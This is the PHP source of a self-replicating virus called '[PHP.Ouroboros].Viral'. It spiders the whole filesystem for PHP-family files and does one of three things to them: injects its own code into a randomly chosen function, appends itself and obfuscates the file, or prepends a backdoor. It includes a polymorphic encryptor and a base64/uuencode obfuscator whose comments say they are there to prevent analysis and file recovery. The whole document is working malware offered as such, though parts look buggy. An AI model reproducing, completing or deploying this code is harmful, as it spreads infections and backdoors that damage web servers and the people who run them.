<?php

/*
[PHP.Ouroboros].Viral
By: Nomenumbra
*/

$phpextensions[0] = "php";
$phpextensions[1] = "php2";
$phpextensions[2] = "php3";
$phpextensions[3] = "php4";
$phpextensions[4] = "php5";
$phpextensions[5] = "ph";
$phpextensions[6] = "ph2";
$phpextensions[7] = "ph3";
$phpextensions[8] = "ph4";
$phpextensions[9] = "ph5";
$phpextensions[10] = "inc";

function EnumFuncs($input)
{
  // enumerate all functions in the script
  $functions = array();
  $funccount = 0;
  $temp = explode("function",$input);
  for($r = 1; $r < count($temp);$r++)
  {
    $sep = $temp[$r];
    $check=0;
    $i=0;
    for ($i = 0; $i < strlen($sep); $i++)
    { 
      if ($sep{$i}=='{')
        $check++;
      if ($sep{$i+1}=='}')
      {
        $pz = $i+1;
        $check--;
      } 
    }
    $functions[$funccount] = "function ".substr($sep,0,$pz+1);
    $funccount++;
  }  
   return $functions; 
}

function ExtractFunctionName($function,$raw)
{
  //extract the name of a function from a piece of function code
  $pz = -1;
  for ($i = 0; $i < strlen($function); $i++)
  {
    if ($function{$i} == '{')
    {
      $pz = $i;
      break;
    }
  }
  if ($pz)
  {
    $tmp = substr($function,0,$i);
    $tmp = preg_replace('#\r| |\n|#','',substr($tmp,strpos($tmp,"function")+9,strlen($tmp)));
    if(!$raw)
    {
      $tmp = substr($tmp,0,strpos($tmp,"(")+1);
    }
    else
      $tmp = "function ".$tmp;
    return $tmp;
  }
}

function NewName()
{
  $len = rand(10,15);
  $newname = '';
  for($i = 0; $i < $len; $i++)
    $newname .= chr(rand(97,122));
  return $newname;
}

function Hermes($content)
{
  //Polymorphic encryptor that changes the cryptographic operations and keys used each generation
  $key = rand(5,50); 
  $operation = array('+','-','*'); // no division, to prevent division by 0 errors
  $inverseops = array('-','+','/');
  $operation2 = array('+','-','*','%');
  $choice = rand(0,2);
  $arith = $operation[$choice];
  $invarith = $inverseops[$choice];
  $arith2 = $operation2[rand(0,3)];
  $newcontent = '';
  $count=-1;
  $cryptop = '$cChar = chr(ord($content{$count}) '.$arith.' ($key '.$arith2.' $count));if ($cChar == chr(39)) $cChar = \'\\\\\'.chr(39);if ($cChar == chr(92)) $cChar = \'\\\\\'.chr(92);$newcontent .= $cChar;';
  while(++$count<strlen($content))
    eval($cryptop);
  $retval = '<?php '.chr(36).'cont = \''.$newcontent.'\'; '.chr(36).'newcont = \'\'; '.chr(36).'cnt = 0; while(++'.chr(36).'cnt < strlen('.chr(36).'cont)) { '.chr(36).'newcont .= chr(ord('.chr(36).'cont{'.chr(36).'cnt}) '.$invarith.' ('.$key.$arith2.chr(36).'cnt)); }; fwrite(fopen(__FILE__,\'w\'),\'<\'.'.chr(36).'newcont);';
  return $retval;
}

/*
  Erebus is an encryption scheme used to obfuscate infected (and specifically targeted) files
  to prevent easy analysis and file recovery. 
  It consits of 2 operations, the Hermes round, that encrypts the file with an extremely weak yet polymorphic algorithm and prepends
  a decryptor to it and
  the main round that encodes the file using base64 and uuencode and it also removes all newlines, thus making the file hard to read
*/

function Erebus($content)
{
  //polymorphic obfuscator that 'encodes' the data a random number of times and adds a 'decoder' to the code
  $content = str_replace("\n","",$content);
  $key = rand(1,10); // number of charon rounds
  for($i = 0; $i < $key; $i++)
    $content = convert_uuencode(base64_encode($content));
  $tmpfl = NewName();
  $content = str_replace(chr(39),chr(92).chr(39),str_replace(chr(92),chr(92).chr(92),$content));
  return "<?php \$out = '".$content."';for(\$i = 0; \$i < ".$key."; \$i++) \$out = base64_decode(convert_uudecode(\$out)); fwrite(fopen(__FILE__,\"w\"),\$out); copy(__FILE__,".$tmpfl.".php); include(\"".$tmpfl."\".php); unlink(\"".$tmpfl."\".php); ?>";
}

function ObfuscateFile($file)
{
  // substitute function names
  $content = fread(fopen($file,"r"),filesize($file));  
  $functions = EnumFuncs($content);
  for ($i = 0; $i < count($functions); $i++)
  {
    $fname = ExtractFunctionName($functions[$i],0);
    $newfunctionname = NewName()."(";
    $regex = eregi_replace("\("," *\\(",$fname); // make a regex out of the name so my_function( and my_function ( are found
    $content = eregi_replace($regex,$newfunctionname,$content);
  }  
 //obfuscate variable names (matching those in the array changevars (this is effective for viral obfuscation only))
 $counti=0;
 while($MAIN['changevars'][$counti])
   $content=str_replace($MAIN['changevars'][++$counti], NewName(), $content);
 //encryption
 fwrite(fopen($file,"w"),Erebus($content));
}

/*
  EPO infection routine . The victim will be analyzed (it's functions will be extracted and 
  one will be chosen to be the carrier (that is, to be infected with the viral code)
*/

function EPOInfect($victim)
{ 
  $content = fread(fopen($victim,"r"),filesize($victim));  
  $functions = EnumFuncs($content); 
  $choice = rand(0,count($functions)-1);
  $target = ExtractFunctionName($functions[$choice],1);
  $firstpart = substr($content,0,strpos($content,$target));
  $rest = substr($content,strpos($content,$target),strlen($content));  
  $pz = -1;
  for ($i = 0; $i < strlen($rest); $i++)
  {
    if ($rest{$i} == '{')
    {
      $pz = $i;
      break;
    }
  }
  $lefthalf = substr($rest,0,$pz+1);
  $righthalf = substr($rest,$pz+1,strlen($rest));

  $newcontent = $firstpart.$lefthalf." ?".chr(62)." ".$MAIN['filecontent']." ".chr(60)."?php ".$righthalf; // sit in front of function, of course, we could go in back or middle too
  fwrite(fopen($victim,"w"),$newcontent);
}

/*
  Appending infection routine, the viral code will be appended after the victim and the infected file
  will be obfuscated with the Erebus algorithm.
*/

function AppendInfect($victim)
{
  $victimcontent = fread(fopen($victim,"r"),filesize($victim));
  fwrite(fopen($file, 'w'),$victimcontent.$MAIN['filecontent']);
  ObfuscateFile($victim);
}

// infection/obfuscation/backdooring routine, backdooring any file matching the $MAIN['bd'] criterium

function HandleFile($victim)
{
  if(strstr(fread(fopen($victim,"r"),filesize($victim)),$MAIN['signature'])) // no double infections
    return;
  // backdoor or infect (backdoored files must be sneaky and not mutated
  if (eregi($MAIN['bd'],$victim))
    fwrite(fopen($victim,"a+"),$MAIN['backdoor']."\n".fread(fopen($victim,"r"),filesize($victim))); // prepend the backdoor to the victim
  else
  {
    $luckynumber = rand(1,5);
    if ($luckynumber == 1)
      EPOInfect($victim);
    elseif ($luckynumber == 3)
      AppendInfect($victim);
    elseif ($luckynumber == 5)
      ObfuscateFile($victim); 
  }
}

/*
  Crawl function to spider the entire drive and infect files
*/

function Crawl($dir)
{
 $currentdir = opendir($dir);
 while ($dircontent = readdir($currentdir))
  {
    $cdir = $dir.$dircontent;
    if (is_dir($cdir) & ($dircontent != '.') & ($dircontent != '..'))
    {            
      Crawl($cdir.$MAIN['filedelimeter']);
    }
    else
    {
     for($f = 0; $f < count($phpextensions);$f++)
      if((strtolower(substr(strrchr($cdir, "."), 1)) == $phpextensions[$f]))
        HandleFile($cdir);
    }
  }
}

function Pr0pagate() // propagation routine
{
 Crawl(dirname(__FILE__)); // spider current dir (webdir)
 if($MAIN['os'] == 1)
   Crawl("/"); // linux
 else
 {
  $temp = explode("\\",__FILE__); // determine main drive (could be D:\ ya know?
  Crawl($temp[0]."\\"); // infect main drive (eg C:\\ on windows or / on linux)
 } 
}

?>